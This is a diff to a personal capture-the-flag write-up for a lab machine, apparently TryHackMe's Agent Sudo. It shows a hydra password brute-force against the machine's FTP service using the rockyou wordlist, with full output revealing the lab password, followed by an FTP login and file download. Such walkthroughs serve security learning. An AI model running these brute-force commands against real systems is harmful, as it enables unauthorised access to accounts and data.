@@ -67,7 +67,68 @@ After that we are greeted by a redirection page:
 
 ![[Pasted image 20220818203458.png]]
 
-Using these information, we can now use hydra to crack ftp password (remember nmap, port 22 and port )
+Using these information, we can now use hydra to crack ftp password (remember nmap, port 22 and port 80?) since Agent R said password is weak:
+
+```
+┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]
+└─$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.170.97 ftp -t 4
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-18 20:24:14
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ftp://10.10.170.97:21/
+[STATUS] 48.00 tries/min, 48 tries in 00:01h, 14344351 to do in 4980:41h, 4 active
+[STATUS] 48.00 tries/min, 144 tries in 00:03h, 14344255 to do in 4980:39h, 4 active
+[21][ftp] host: 10.10.170.97   login: chris   password: crystal
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-18 20:29:35
+                                                                                                                       
+┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]
+└─$ 
+
+
+```
+
+#### Hash cracking and brute-force
+
+Done enumerate the machine? Time to brute your way out.
+
+FTP Password: crystal
+
+Use the username and password acquired from earlier 
+
+```
+┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]
+└─$ ftp 10.10.170.97
+Connected to 10.10.170.97.
+220 (vsFTPd 3.0.3)
+Name (10.10.170.97:kali): chris
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||62242|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
+-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
+-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
+226 Directory send OK.
+ftp> get To_agentJ.txt
+local: To_agentJ.txt remote: To_agentJ.txt
+229 Entering Extended Passive Mode (|||10689|)
+150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
+100% |**************************************************************************|   217        1.39 MiB/s    00:00 ETA
+226 Transfer complete.
+217 bytes received in 00:00 (0.29 KiB/s)
+ftp> 
+
+```
+
+
+![[Pasted image 20220818203845.png]]
+
 
 
 
